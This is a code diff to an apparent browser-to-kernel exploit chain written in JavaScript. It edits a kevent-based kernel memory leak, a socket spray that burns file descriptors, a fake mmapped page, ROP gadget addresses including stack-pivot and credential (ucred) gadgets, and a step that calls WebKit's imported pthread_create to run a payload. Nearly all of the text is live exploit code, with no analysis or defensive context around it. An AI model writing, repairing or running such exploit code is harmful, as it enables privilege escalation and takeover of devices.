@@ -294,7 +294,7 @@ function phase2Leak(rootKq, fds) {
           cl.dv.setInt16(10, 2, true);
           scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
         }
-        scn("close", dce); // MUST close dce on failure so the fd increments
+        scn("close", dce);
         rearm(fd, tpl);
         fds[vi] = fd;
       }
@@ -319,7 +319,6 @@ export async function runKevent(c) {
 
   ensureStubs();
 
-  // FD BURNER
   const burn = [];
   for (let i = 0; i < 250; i++) {
     const fd = scn("socket", AF_INET, SOCK_STREAM, 0);
@@ -346,14 +345,7 @@ export async function runKevent(c) {
   if (fake_page < 0x10000n) fin("STAGE3 mmap failed");
   log("STAGE3-FAKE", "mapped fake page at " + h16(fake_page));
 
-  const R_SLOT = ka(P[13]), R_OPS = ka(P[14]);
   const R_RET0 = ka(P[15]), R_TOUCH = ka(P[16]);
-  const R_POPRSP = ka(P[17]), R_SAVE = ka(P[18]);
-  const R_REST = ka(P[19]), R_CONT = ka(P[20]);
-  const R_PRAX = ka(P[21]), R_PRDX = ka(P[22]), R_PRDI = ka(P[23]);
-  const R_UCRED = ka(P[24]), R_RAXRCX = ka(P[25]);
-  const R_LDRAX = ka(P[26]), R_ADDRAX = ka(P[27]);
-  const R_STRAXRDX = ka(P[28]), R_STRDIRAX = ka(P[29]);
 
   const p = ctx().p;
   const F_FAKE_OPS = fake_page + 0x800n;
@@ -392,7 +384,8 @@ export async function runKevent(c) {
 
   log("STAGE4-RUN", "Spawning payload...");
   
-  const pthread_create = ctx().p.read8(ctx().webkitBase.add32(ctx().off.wk___imp_pthread_create));
+  // THE FIX: Use c.off to access the firmware offsets
+  const pthread_create = ctx().p.read8(ctx().webkitBase.add32(c.off.wk___imp_pthread_create));
   const thr = new ArrayBuffer(8);
   c.keepAlive.push(thr);
   new Uint8Array(thr).fill(0);
